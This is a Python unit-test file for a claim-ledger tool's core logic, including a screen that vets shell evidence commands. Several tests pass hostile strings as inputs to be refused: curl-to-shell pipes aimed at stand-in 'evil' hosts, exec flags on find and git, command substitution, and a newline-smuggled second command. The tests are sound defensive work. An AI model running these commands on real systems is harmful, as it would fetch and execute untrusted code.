#!/usr/bin/env python3
"""test-truth-core.py -- unit tests for truth's PURE CORE.

Runs in milliseconds with no git, no filesystem writes, no clock: every
function under test takes plain data (time is a parameter). The canary
remains the acceptance layer; this file is the fast inner loop.

Also contains the SCHEMA CONFORMANCE test: a shared fixture corpus of
records, each labeled valid/invalid, asserted against BOTH contract
representations -- validate_events (stdlib mirror) always, and the JSON
Schema whenever the optional `jsonschema` package is importable. Two
representations of one contract are acceptable only while something
detects their drift; this corpus is that something.

Run: python3 scripts/test-truth-core.py
"""
import importlib.machinery
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
_loader = importlib.machinery.SourceFileLoader("truthmod",
                                               os.path.join(HERE, "truth"))
_spec = importlib.util.spec_from_loader("truthmod", _loader)
tm = importlib.util.module_from_spec(_spec)
_loader.exec_module(tm)

NOW = datetime(2026, 7, 5, 12, 0, 0, tzinfo=timezone.utc)
TS = "2026-07-01T00:00:00.000000+00:00"  # ADR-015 canonical profile

def rec(kind, payload, rid="tr-00000001", ts=TS):
    return {"id": rid, "kind": kind, "actor": "t", "session": "s",
            "ts": ts, "payload": payload}

def claim_p(**over):
    p = {"text": "f.txt says data", "evidence_class": "UNVERIFIED",
         "cost_tier": "P2", "ttl_days": None, "evidence_paths": []}
    p.update(over)
    return p

def verified_p(**over):
    p = claim_p(evidence_class="VERIFIED",
                evidence={"command": "cat f.txt",
                          "output_hash": "sha256:" + "0" * 64,
                          "returncode": 0},
                anchor_commit="abc1234", evidence_paths=["f.txt"])
    p.update(over)
    return p

def events(*evs):
    return list(enumerate(evs, 1))

# ---------------------------------------------------------------- fold

class TestFold(unittest.TestCase):
    def test_empty(self):
        claims, premises = tm.fold([])
        self.assertEqual((claims, premises), ({}, {}))

    def test_claim_starts_unverified(self):
        claims, _ = tm.fold(events(rec("claim", claim_p())))
        self.assertEqual(claims["tr-00000001"]["status"], "unverified")
        self.assertEqual(claims["tr-00000001"]["status_ts"], TS)

    def test_last_event_wins(self):
        evs = events(
            rec("claim", claim_p()),
            rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                            "basis": "b"}, rid="tr-00000002"),
            rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                            "basis": "b"}, rid="tr-00000003",
                ts="2026-07-02T00:00:00+00:00"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["status"], "diverged")
        self.assertEqual(claims["tr-00000001"]["status_ts"],
                         "2026-07-02T00:00:00+00:00")

    def test_every_verdict_mapping(self):
        for verdict, status in (("agree", "live"), ("diverge", "diverged"),
                                ("cannot_verify", "cannot_verify"),
                                ("retracted", "retracted")):
            claims, _ = tm.fold(events(
                rec("claim", claim_p()),
                rec("verdict", {"claim": "tr-00000001", "verdict": verdict,
                                "basis": "b"}, rid="tr-00000002")))
            self.assertEqual(claims["tr-00000001"]["status"], status, verdict)

    def test_invalidation_marks_stale(self):
        claims, _ = tm.fold(events(
            rec("claim", claim_p()),
            rec("invalidation", {"claim": "tr-00000001", "commit": "abc1234",
                                 "reason": "x"}, rid="tr-00000002")))
        self.assertEqual(claims["tr-00000001"]["status"], "stale")

    def test_retracted_is_terminal(self):
        evs = events(
            rec("claim", claim_p()),
            rec("verdict", {"claim": "tr-00000001", "verdict": "retracted",
                            "basis": "wrong"}, rid="tr-00000002"),
            rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                            "basis": "resurrect"}, rid="tr-00000003",
                ts="2026-07-03T00:00:00+00:00"),
            rec("invalidation", {"claim": "tr-00000001", "commit": "abc1234"},
                rid="tr-00000004"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["status"], "retracted")
        self.assertEqual(claims["tr-00000001"]["status_ts"], TS)  # unchanged

    def test_negative_verdicts_are_recoverable(self):
        """ADR-020 (H3): diverged, cannot_verify, and stale all recover to
        live via a later agree -- only retracted is terminal."""
        for kind, payload in (
            ("verdict", {"claim": "tr-00000001", "verdict": "diverge", "basis": "b"}),
            ("verdict", {"claim": "tr-00000001", "verdict": "cannot_verify", "basis": "b"}),
            ("invalidation", {"claim": "tr-00000001", "commit": "abc1234", "reason": "x"}),
        ):
            claims, _ = tm.fold(events(
                rec("claim", claim_p()),
                rec(kind, payload, rid="tr-00000002"),
                rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                "basis": "rechecked"}, rid="tr-00000003",
                    ts="2026-07-05T00:00:00.000000+00:00")))
            self.assertEqual(claims["tr-00000001"]["status"], "live", kind)

    def test_retracted_absorbs_in_any_order(self):
        """ADR-020: retracted wins whether earlier or later than another
        verdict and independent of physical order -- set_status short-
        circuits on the FOLDED status, not on ts."""
        import itertools
        claim = rec("claim", claim_p())
        agree = rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                "basis": "b"}, rid="tr-0000000a",
                    ts="2026-07-10T00:00:00.000000+00:00")   # LATER than retract
        retr = rec("verdict", {"claim": "tr-00000001", "verdict": "retracted",
                               "basis": "kill"}, rid="tr-0000000b",
                   ts="2026-07-05T00:00:00.000000+00:00")    # EARLIER than agree
        for perm in itertools.permutations([claim, agree, retr]):
            claims, _ = tm.fold(events(*perm))
            self.assertEqual(claims["tr-00000001"]["status"], "retracted", perm)

    def test_verdict_precedence_is_confluent(self):
        """ADR-020 (H3): the anti-C1 lock. Distinct-id verdicts on one
        claim, folded in EVERY physical order, yield ONE status -- the
        highest-key (ts,id,canon) setter wins, so backdating cannot change
        the outcome. C1 broke confluence; the verdict path does not."""
        import itertools
        claim = rec("claim", claim_p())
        agree = rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                "basis": "b"}, rid="tr-0000000a",
                    ts="2026-07-05T00:00:00.000000+00:00")
        cverif = rec("verdict", {"claim": "tr-00000001", "verdict": "cannot_verify",
                                 "basis": "b"}, rid="tr-0000000b",
                     ts="2026-07-08T00:00:00.000000+00:00")
        diverge = rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                                  "basis": "b"}, rid="tr-0000000c",
                      ts="2026-07-10T00:00:00.000000+00:00")
        seen = set()
        for perm in itertools.permutations([claim, agree, cverif, diverge]):
            claims, _ = tm.fold(events(*perm))
            seen.add(claims["tr-00000001"]["status"])
        self.assertEqual(seen, {"diverged"})  # diverge@07-10 is the highest key
        # The reviewer's worked example: cannot_verify@5 then backdated
        # agree@3 -> cannot_verify (5 is the higher key), in every order.
        cv5 = rec("verdict", {"claim": "tr-00000001", "verdict": "cannot_verify",
                              "basis": "b"}, rid="tr-0000000d",
                  ts="2026-07-05T00:00:00.000000+00:00")
        ag3 = rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                              "basis": "backdated"}, rid="tr-0000000e",
                  ts="2026-07-03T00:00:00.000000+00:00")
        for perm in itertools.permutations([claim, cv5, ag3]):
            claims, _ = tm.fold(events(*perm))
            self.assertEqual(claims["tr-00000001"]["status"], "cannot_verify", perm)

    def test_premise_map(self):
        _, premises = tm.fold(events(
            rec("premise", {"issue": "bd-x1", "claim": "tr-00000009"})))
        self.assertEqual(premises, {"bd-x1": ["tr-00000009"]})

# ------------------------------------------------------- premise matrix

class TestPremiseMatrix(unittest.TestCase):
    def test_adr_001(self):
        cases = [
            ("live", "P0", True), ("live", "P2", True),
            ("unverified", "P0", True), ("unverified", "P2", True),
            ("cannot_verify", "P0", False),          # strict for P0
            ("cannot_verify", "P1", True),
            ("cannot_verify", "P2", True),
            ("stale", "P2", False), ("diverged", "P0", False),
            ("retracted", "P1", False), ("missing", "P2", False),
        ]
        for status, tier, expect in cases:
            passes, _ = tm.premise_check(status, tier)
            self.assertEqual(passes, expect, (status, tier))

    def test_warnings_present(self):
        self.assertIsNotNone(tm.premise_check("unverified", "P1")[1])
        self.assertIsNotNone(tm.premise_check("cannot_verify", "P1")[1])
        self.assertIsNone(tm.premise_check("live", "P1")[1])

# --------------------------------------------------------- primitives

class TestPrimitives(unittest.TestCase):
    def test_match_paths(self):
        self.assertTrue(tm.match_paths("services/api/x.py", ["services/api/**"]))
        self.assertTrue(tm.match_paths("services/api", ["services/api/**"]))
        self.assertFalse(tm.match_paths("services/apix/x.py", ["services/api/**"]))
        self.assertTrue(tm.match_paths("f.txt", ["*.txt"]))
        self.assertFalse(tm.match_paths("f.py", ["*.txt"]))

    def test_jaccard(self):
        self.assertEqual(tm.jaccard("a b c", "a b c"), 1.0)
        self.assertEqual(tm.jaccard("a b", "c d"), 0.0)
        self.assertEqual(tm.jaccard("", "a"), 0.0)

    def test_duplicate_conflicts_only_active(self):
        # ADR-018: "active" is exactly {live, unverified}; every other
        # status is dead-for-intake and a correcting refile is allowed.
        base = "payments module handles currency conversion"
        claims = {"tr-0000000a": {"status": "live",
                                  "claim": rec("claim", claim_p(text=base))}}
        for i, dead in enumerate(("stale", "diverged", "cannot_verify",
                                  "retracted", "disputed")):
            claims[f"tr-0000010{i}"] = {"status": dead,
                                        "claim": rec("claim", claim_p(text=base))}
        hits = tm.duplicate_conflicts("payments module handles all currency conversion", claims)
        self.assertEqual([cid for cid, _ in hits], ["tr-0000000a"])  # only the live one

    def test_near_dup_metric_is_jaccard_not_overlap(self):
        """ADR-018 (H1): the near-dup metric is symmetric Jaccard, not the
        overlap coefficient a vague "overlap >= 0.6" reading invites. The
        two diverge on a strict token-subset (an elaboration of an
        existing claim): Jaccard accepts it, overlap-coefficient refuses
        it. Pin the reference to Jaccard so two implementers cannot
        diverge across the 0.6 boundary."""
        a = "auth module owns login"
        b = "auth module owns login and also owns logout and session refresh handling"
        ta, tb = tm.tokens(a), tm.tokens(b)
        self.assertTrue(ta <= tb)  # a's tokens are a strict subset of b's
        inter = len(ta & tb)
        # Reference metric: Jaccard = 4/10 = 0.4 -> below 0.6 -> NOT a duplicate.
        self.assertAlmostEqual(tm.jaccard(a, b), 0.4)
        self.assertLess(tm.jaccard(a, b), tm.DUPLICATE_THRESHOLD)
        # The overlap coefficient on the same tokens is 1.0 -> a conforming
        # implementer who read "overlap" literally would REFUSE. Proof the
        # spec ambiguity was real and is now resolved away from it.
        overlap_coeff = inter / min(len(ta), len(tb))
        self.assertEqual(overlap_coeff, 1.0)
        self.assertGreaterEqual(overlap_coeff, tm.DUPLICATE_THRESHOLD)
        # At the gate: b is accepted against an active a (no conflict row).
        claims = {"tr-0000000a": {"status": "live",
                                  "claim": rec("claim", claim_p(text=a))}}
        self.assertEqual(tm.duplicate_conflicts(b, claims), [])

# ---------------------------------------------------- intake decisions

class TestIntake(unittest.TestCase):
    def test_verified_requires_cmd_paths_head(self):
        self.assertIn("INV-B", tm.verified_intake_error(None, ["f"], None, "abc"))
        self.assertIn("G10", tm.verified_intake_error("cat f", [], None, "abc"))
        self.assertIsNone(tm.verified_intake_error("cat f", [], 7, "abc"))  # ttl ok
        self.assertIn("G1", tm.verified_intake_error("cat f", ["f"], None, None))
        self.assertIsNone(tm.verified_intake_error("cat f", ["f"], None, "abc"))

    def test_inferred_requires_basis(self):
        self.assertIsNotNone(tm.inferred_intake_error(None))
        self.assertIsNone(tm.inferred_intake_error("naming convention"))

    def test_determinism(self):
        self.assertIsNone(tm.determinism_error(("h", 0), ("h", 0)))
        self.assertIn("G6", tm.determinism_error(("h1", 0), ("h2", 0)))
        self.assertIn("G6", tm.determinism_error(("h", 0), ("h", 1)))

    def test_malformed_path_list(self):
        """INV-M: '--paths "a.sh b.sh"' with no comma stores as one
        whitespace-containing literal -- the exact tr-3591aae0 shape."""
        self.assertEqual(tm.malformed_path_list(["a.sh b.sh"]), ["a.sh b.sh"])
        self.assertEqual(tm.malformed_path_list(["a.sh", "b.sh"]), [])
        self.assertEqual(tm.malformed_path_list(["a.sh", "b.sh", "c d.sh"]),
                         ["c d.sh"])
        self.assertEqual(tm.malformed_path_list([]), [])

    def test_split_csv_drops_empty_entries(self):
        """v0.5.6: a trailing or doubled comma must never surface as a
        refusal of the literal '' (the pre-fix behavior was fails-closed
        but cryptic: dead_literal_paths reported [''])."""
        self.assertEqual(tm.split_csv("a.sh,"), ["a.sh"])
        self.assertEqual(tm.split_csv("a.sh,,b.sh"), ["a.sh", "b.sh"])
        self.assertEqual(tm.split_csv(" a.sh , b.sh "), ["a.sh", "b.sh"])
        self.assertEqual(tm.split_csv(","), [])
        self.assertEqual(tm.split_csv(""), [])
        self.assertEqual(tm.split_csv(None), [])

    def test_dead_literal_paths(self):
        """INV-M: a literal matching zero tracked files is a dead
        tripwire; explicit globs are exempt even at zero matches."""
        tracked = ["a.sh", "src/x.py"]
        self.assertEqual(tm.dead_literal_paths(["a.sh"], tracked), [])
        self.assertEqual(tm.dead_literal_paths(["missing.sh"], tracked),
                         ["missing.sh"])
        self.assertEqual(tm.dead_literal_paths(["docs/*.md"], tracked), [])
        self.assertEqual(tm.dead_literal_paths(["src/?.py"], tracked), [])
        self.assertEqual(
            tm.dead_literal_paths(["a.sh", "missing.sh", "docs/*.md"], tracked),
            ["missing.sh"])

    def test_dead_literal_is_the_decidable_case(self):
        """ADR-023 (H5): the gate decides STATIC deadness of LITERALS only.
        A literal has exactly one referent, so a zero-match literal can
        never fire and is refused; a glob names a namespace that can fill,
        so it is exempt even at zero current matches (dormant, not dead).
        The lone residual is a tracked symlink literal -- it IS in the
        tracked set, so the membership check passes; the gate is blind to
        the fact that git tracks the link, not its target (ADR-023 leaves
        this to guidance: watch real paths)."""
        tracked = ["a.sh", "link.txt"]        # link.txt stands in for a tracked symlink
        # a literal absent from the tracked set is statically dead -> refused
        self.assertEqual(tm.dead_literal_paths(["missing.sh"], tracked),
                         ["missing.sh"])
        # a glob is never refused for zero current matches -- it is dormant
        self.assertEqual(tm.dead_literal_paths(["src/ghost/*.py"], tracked), [])
        # residual: a tracked symlink literal passes the membership check
        self.assertEqual(tm.dead_literal_paths(["link.txt"], tracked), [])

    def test_dead_glob_paths_refuses_unreachable(self):
        """ADR-024 (H5 follow-up): a glob is exempt from the dead-literal
        gate, but a glob matching no path git diff could emit is a dead
        tripwire all the same. git-diff paths are repo-relative, normalized,
        never under .git -- so an absolute pattern, a trailing slash, a
        '.'/'..'/empty component, or a leading '.git' component is dead.
        These are exactly the shapes an adversarial verifier found slipping
        the exemption; each is flagged."""
        for g in ["/etc/*.conf", "zone/*/", "a*/", "../*.txt", "./src/*.py",
                  "a/./b*.py", "dbl//*.txt", ".git/*", ".git/**"]:
            self.assertEqual(tm.dead_glob_paths([g]), [g], g)

    def test_dead_glob_paths_keeps_reachable(self):
        """ADR-024: SOUND, not complete -- no false refusals. Every glob
        over a reachable namespace passes, including the two that look like
        the dead shapes but are not: '.git*' matches .gitignore, and
        '.github/**' is an ordinary tracked directory."""
        for g in ["src/**", "src/*/test.py", "**/*.py", "*.txt", "src/?.py",
                  "a/b*.py", "**", "*", ".git*", ".github/**"]:
            self.assertEqual(tm.dead_glob_paths([g]), [], g)
        # a plain literal is not this gate's concern (dead_literal_paths owns it)
        self.assertEqual(tm.dead_glob_paths(["src/main.py"]), [])

    def test_ci_gate_names_detects_and_misses(self):
        """ADR-025 (H6): doctor decides the CI arm of the commit-gate MUST
        by grepping known CI configs for the gate script name -- so a
        CI-only repo passes instead of false-failing. A workflow naming the
        gate is found (under .github/workflows and at top-level CI paths);
        an unrelated file is not; a repo with no CI config yields None."""
        with tempfile.TemporaryDirectory() as root:
            wf = os.path.join(root, ".github", "workflows")
            os.makedirs(wf)
            # no CI naming the gate yet
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # an unrelated workflow does NOT satisfy the gate
            with open(os.path.join(wf, "lint.yml"), "w") as f:
                f.write("jobs:\n  lint:\n    steps:\n      - run: ruff .\n")
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # a workflow naming the gate script IS found, and the path is returned
            with open(os.path.join(wf, "truth.yml"), "w") as f:
                f.write("jobs:\n  gate:\n    steps:\n      - run: bash scripts/check-truth.sh\n")
            self.assertEqual(tm.ci_gate_names("check-truth", root),
                             os.path.join(".github", "workflows", "truth.yml"))
            # a top-level CI file (e.g. .gitlab-ci.yml) is scanned too
            with open(os.path.join(root, ".gitlab-ci.yml"), "w") as f:
                f.write("gate:\n  script: python scripts/truth invalidate-scan\n")
            self.assertEqual(tm.ci_gate_names("invalidate-scan", root),
                             ".gitlab-ci.yml")

    def test_ci_gate_names_top_level_yaml_only(self):
        """ADR-025 (H6 adversarial fix): CI runs only TOP-LEVEL *.yml/*.yaml
        under .github/workflows/, so doctor must too -- a `disabled/` subdir
        or a `.yml.disabled` rename is a gate CI never runs and must NOT
        satisfy the MUST (else doctor reports a deliberately-off gate as OK)."""
        with tempfile.TemporaryDirectory() as root:
            wf = os.path.join(root, ".github", "workflows")
            os.makedirs(os.path.join(wf, "disabled"))
            # (a) workflow in a subdirectory -- GitHub never runs it
            with open(os.path.join(wf, "disabled", "truth.yml"), "w") as f:
                f.write("run: bash scripts/check-truth.sh\n")
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # (b) rename-to-disable: the standard "turn this off" idiom
            with open(os.path.join(wf, "truth.yml.disabled"), "w") as f:
                f.write("run: bash scripts/check-truth.sh\n")
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # (c) a genuine top-level .yaml (not just .yml) IS scanned
            with open(os.path.join(wf, "gate.yaml"), "w") as f:
                f.write("run: bash scripts/check-truth.sh\n")
            self.assertEqual(tm.ci_gate_names("check-truth", root),
                             os.path.join(".github", "workflows", "gate.yaml"))

# ------------------------------------- quantifier-scope gate (ADR-007)

class TestQuantifierScope(unittest.TestCase):
    def test_fires_on_the_pilot_shape(self):
        """A repo-wide clause over an --include-filtered grep: the exact
        shape of both genuine pilot divergences."""
        c = tm.quantifier_scope_conflict(
            "the only occurrences in the repo are in payments",
            "grep -rn convert --include='*.py' .")
        self.assertIsNotNone(c)
        q, s = c
        self.assertIn(q, ("only", "the repo"))  # both fire; either names it
        self.assertTrue(s.startswith("--include"), s)

    def test_fires_on_path_scoped_command(self):
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "grep -rn frobnicate src/api"))

    def test_phrase_boundary_repo_vs_repository(self):
        """'the repo' must not fire inside 'the repository'."""
        self.assertIsNone(tm.quantifier_scope_conflict(
            "the repository layer caches sessions and misses stay cheap",
            "grep -rn cache --include='*.py'"))

    def test_silent_without_quantifier(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "payments module converts currency",
            "grep -rn convert --include='*.py' ."))

    def test_silent_without_scoping(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "grep -rn frobnicate"))

    def test_silent_without_evidence_cmd(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "all modules are converted", None))

    def test_cd_prefix_is_a_scope_signal(self):
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "zero failures anywhere", "cd services && grep -c FAIL log.txt"))

    def test_ripgrep_type_filter_is_a_scope_signal(self):
        """F3/v0.6.2: rg -t py narrows the domain with no slash, so it
        used to evade the positional check."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "rg -t py legacyAuth ."))

    def test_glob_metacharacter_positional_is_a_scope_signal(self):
        """F3/v0.6.2: 'src/*.py' scopes without an --include flag."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "X appears everywhere in the code", "grep -c X src/*.py"))

    def test_widened_lexicon_everywhere_always(self):
        """F3/v0.6.2: everywhere/always/each joined the lexicon."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "this always holds", "grep -t py X ."))

# ------------------------------------------ evidence screen (ADR-009)

ALLOW = ["git", "grep", "cat", "wc", "echo", "sort", "find"]

class TestEvidenceScreen(unittest.TestCase):
    def test_allowlisted_passes(self):
        self.assertIsNone(tm.screen_evidence_command("grep -c x f.txt", ALLOW))

    def test_pipeline_of_allowlisted_passes(self):
        self.assertIsNone(tm.screen_evidence_command(
            "grep -rn x . | sort | wc -l", ALLOW))
        self.assertIsNone(tm.screen_evidence_command(
            "grep -q x f.txt && echo CLEAN", ALLOW))

    def test_input_redirection_passes(self):
        self.assertIsNone(tm.screen_evidence_command("wc -l < f.txt", ALLOW))

    def test_unlisted_program_refused(self):
        err = tm.screen_evidence_command("curl https://evil.example", ALLOW)
        self.assertIn("curl", err)

    def test_unlisted_segment_in_pipeline_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command(
            "grep x f.txt && curl evil | sh", ALLOW))

    def test_output_redirection_refused(self):
        self.assertIn("read-only",
                      tm.screen_evidence_command("echo pwned > f.txt", ALLOW))

    def test_command_substitution_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command("echo $(id)", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command("echo `id`", ALLOW))

    def test_path_form_program_refused(self):
        """./grep is an attacker-supplied binary wearing an allowlisted
        name; bare names resolve via PATH, paths resolve via the repo."""
        self.assertIsNotNone(tm.screen_evidence_command("./grep x", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command("/tmp/grep x", ALLOW))

    def test_missing_allowlist_fails_closed(self):
        err = tm.screen_evidence_command("grep x f.txt", None)
        self.assertIn("fails closed", err)

    def test_dangling_operator_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command("grep x f.txt &&", ALLOW))

    def test_quoted_pipe_is_an_argument_not_a_separator(self):
        """The first real ledger command (tr-dca73f8a): a grep -oE regex
        with '|' alternations inside single quotes. A naive operator
        split shreds it; the quote-aware screen must pass it."""
        self.assertIsNone(tm.screen_evidence_command(
            "grep -oE 'getattr\\(a|os\\.environ|bd ready' f.py", ALLOW))

    def test_dev_null_and_fd_dup_sinks_allowed(self):
        """The pin-the-output convention's canonical shape (tr-3a31bfcf):
        redirecting TO the bit bucket is read-only by definition."""
        self.assertIsNone(tm.screen_evidence_command(
            "grep -q x f.txt > /dev/null 2>&1 && echo CLEAN", ALLOW))

    def test_real_file_sink_still_refused(self):
        self.assertIn("read-only", tm.screen_evidence_command(
            "echo pwned > /dev/null && echo more > f.txt", ALLOW))

    def test_subshell_refused(self):
        self.assertIn("unscreenable", tm.screen_evidence_command(
            "(grep x f.txt)", ALLOW))

    def test_allowlisted_program_exec_write_flags_refused(self):
        """F1/v0.6.2: a program can be on the allowlist and still open an
        exec or file-write channel through its own flags. The bare-name
        check passes them; PROGRAM_ARG_DENY must not."""
        for cmd in ("find . -exec sh -c 'curl evil|sh' {} +",
                    "find . -fprintf /tmp/pwn hi",
                    "sort -o /tmp/pwn f.txt",
                    "git -c alias.x=!curl x"):
            self.assertIsNotNone(tm.screen_evidence_command(cmd, ALLOW), cmd)

    def test_read_only_flags_of_denied_program_still_pass(self):
        """The deny is per-flag, not per-program: grep -o (only-matching,
        read-only) must pass even though sort -o (write) is refused --
        the same flag means different things to different programs, which
        is why a program-agnostic flag denylist would be wrong."""
        self.assertIsNone(tm.screen_evidence_command("grep -o foo f.txt", ALLOW))
        self.assertIsNone(tm.screen_evidence_command("find . -name x", ALLOW))
        self.assertIsNone(tm.screen_evidence_command(
            "grep -rn x . | sort | wc -l", ALLOW))

    def test_screen_rejects_control_chars(self):
        """ADR-021 (H4): a newline is word-whitespace to shlex but a
        statement separator to /bin/sh (the executor), so a post-newline
        program lands in argument position at screen time yet RUNS at
        recheck. The screen refuses every ASCII control char except tab,
        making its token stream a sound over-approximation of the shell's."""
        for cmd in ("grep x /dev/null\ntouch PWNED",       # the bypass
                    "grep x /dev/null # c\ntouch PWNED",    # comment + newline
                    "grep x\rtouch PWNED",                  # carriage return
                    "grep x\x0bfoo", "grep x\x0cfoo", "grep x\x7ffoo"):
            self.assertIn("control character",
                          tm.screen_evidence_command(cmd, ALLOW), repr(cmd))
        # tab is word-whitespace to BOTH lexers -- legitimate, must pass
        self.assertIsNone(tm.screen_evidence_command("grep\tx\tf.txt", ALLOW))

    def test_arg_deny_covers_h4_gaps(self):
        """ADR-021 (H4): the adversarial review found enumerable exec/write
        flags on SHIPPED programs the deny table missed -- git lowercase
        -o (only -O/--output were denied, so `git archive -o` wrote files)
        and GNU `sort --compress-program=<cmd>` (an exec channel). Both
        refused now; the table's contents are pinned against silent drift."""
        self.assertIsNotNone(
            tm.screen_evidence_command("git archive -o /tmp/pwn HEAD", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command(
            "sort --compress-program=touch -S1 f.txt", ALLOW))
        self.assertLessEqual({"-o", "--output", "--compress-program"},
                             tm.PROGRAM_ARG_DENY["sort"])
        self.assertIn("-o", tm.PROGRAM_ARG_DENY["git"])

    def test_denylist_wins_over_allowlist(self):
        """ADR-022: a shell/executor on the template-owned deny baseline is
        refused even when the consumer allowlisted it (deny-wins), because
        allowlisting a shell turns the read-only screen into arbitrary
        execution. A non-denied program is unaffected."""
        deny = ["bash", "sh", "env", "xargs", "time"]
        err = tm.screen_evidence_command("bash -c 'echo hi'", ["bash", "grep"],
                                         denylist=deny)
        self.assertIsNotNone(err)
        self.assertIn("evidence-deny", err)
        # env as a program (a generic executor) is refused even if allowed
        self.assertIsNotNone(tm.screen_evidence_command(
            "env grep x f.txt", ["env", "grep"], denylist=deny))
        # `time <cmd>` runs <cmd> as an argument the screen never program-
        # checks -- adversary-confirmed RCE if allowlisted; deny closes it
        self.assertIsNotNone(tm.screen_evidence_command(
            "time bash -c 'touch x'", ["time", "bash"], denylist=deny))
        # a normal allowlisted program is untouched by the deny layer
        self.assertIsNone(tm.screen_evidence_command(
            "grep x f.txt", ["grep"], denylist=deny))
        # an absent deny file (denylist=None) fails open: allowlist governs
        self.assertIsNone(tm.screen_evidence_command(
            "grep x f.txt", ["grep"], denylist=None))

    def test_deny_baseline_not_applied_to_oracles(self):
        """ADR-022: the deny baseline is evidence-only. Acceptance oracles
        (ADR-014) execute repository code on purpose -- `bash run.sh` is
        their normal shape -- so screen_accept_command passes no denylist."""
        self.assertIsNone(tm.screen_accept_command("bash run-tests.sh",
                                                   ["bash"]))

    def test_doctor_grey_zone_set(self):
        """ADR-022: the doctor advisory set names code-executing programs
        with plausible read-only uses (warned, not blocked). Read-only
        staples are NOT in it (they would warn spuriously)."""
        self.assertLessEqual({"git", "python", "curl", "pytest", "sed"},
                             tm.DOCTOR_GREY_ZONE)
        self.assertTrue(tm.DOCTOR_GREY_ZONE.isdisjoint(
            {"grep", "cat", "wc", "find", "sort", "test"}))

class TestAcceptScreen(unittest.TestCase):
    """ADR-014: same structural screen, its own allowlist -- the refusal
    messages must name .truth/accept-allow and the accept escape hatch,
    never ADR-009's evidence vocabulary (a message naming the wrong list
    teaches the wrong fix)."""
    ACC = ["pytest", "bash", "python3"]

    def test_allowlisted_oracle_passes(self):
        self.assertIsNone(tm.screen_accept_command("pytest -q tests", self.ACC))
        self.assertIsNone(tm.screen_accept_command(
            "python3 exercises/harness/runner.py leg --strict", self.ACC))

    def test_unlisted_program_names_accept_allow(self):
        err = tm.screen_accept_command("cargo test", self.ACC)
        self.assertIn(tm.ACCEPT_ALLOW_REL, err)
        self.assertIn("--accept-unsafe-ok", err)
        self.assertNotIn(tm.EVIDENCE_ALLOW_REL, err)

    def test_missing_allowlist_fails_closed_naming_accept_allow(self):
        err = tm.screen_accept_command("pytest -q", None)
        self.assertIn(tm.ACCEPT_ALLOW_REL, err)
        self.assertIn("--accept-cmd", err)

    def test_structural_rules_still_apply(self):
        # one screen implementation (the F1/F5 drift lesson): command
        # substitution, path-form programs, and real-file sinks are
        # refused for oracles exactly as for evidence
        self.assertIsNotNone(tm.screen_accept_command(
            "pytest $(cat pwn)", self.ACC))
        self.assertIsNotNone(tm.screen_accept_command(
            "./run_tests.sh", self.ACC))
        self.assertIsNotNone(tm.screen_accept_command(
            "pytest -q > results.txt", self.ACC))

    def test_path_form_entry_admits_exact_oracle(self):
        """Issue #7: an allowlisted exact repo-relative path runs as an
        oracle; near-misses and traversals do not."""
        acc = ["bash", ".venv/bin/python", "./gradlew"]
        self.assertIsNone(tm.screen_accept_command(
            ".venv/bin/python scripts/test-truth-core.py", acc))
        self.assertIsNone(tm.screen_accept_command("./gradlew test", acc))
        # exact match only -- a different path is refused with the hint
        err = tm.screen_accept_command(".venv/bin/pytest -q", acc)
        self.assertIn(tm.ACCEPT_ALLOW_REL, err)
        # unlisted path still refused
        self.assertIsNotNone(tm.screen_accept_command("./run.sh", acc))

    def test_path_form_entry_never_absolute_or_traversal(self):
        # even a LISTED absolute or ..-path is refused -- the entry is
        # inert, not a policy the screen will honor
        acc = ["/usr/bin/python3", "../outside/tool", ".venv/bin/python"]
        self.assertIsNotNone(tm.screen_accept_command(
            "/usr/bin/python3 -m pytest", acc))
        self.assertIsNotNone(tm.screen_accept_command(
            "../outside/tool run", acc))

    def test_evidence_screen_still_refuses_paths_unconditionally(self):
        # ADR-009 unchanged: a path program is refused for EVIDENCE even
        # if some allowlist listed it -- different trust seam
        self.assertIsNotNone(tm.screen_evidence_command(
            ".venv/bin/python x.py", ALLOW + [".venv/bin/python"]))

    def test_evidence_screen_messages_unchanged(self):
        # regression: the parameterization must not rewrite ADR-009's
        # messages -- they still name evidence-allow and its escape hatch
        err = tm.screen_evidence_command("curl x", ALLOW)
        self.assertIn(tm.EVIDENCE_ALLOW_REL, err)
        self.assertIn("--evidence-unsafe-ok", err)
        err = tm.screen_evidence_command("grep x f.txt", None)
        self.assertIn(tm.EVIDENCE_ALLOW_REL, err)

# --------------------------------------------- order coherence (ADR-008)

class TestOrderCheck(unittest.TestCase):
    T1, T2, T3 = ("2026-07-01T00:00:00+00:00", "2026-07-02T00:00:00+00:00",
                  "2026-07-03T00:00:00+00:00")

    def test_backdated_duplicate_id_is_an_error(self):
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="substitution"), ts=self.T1))
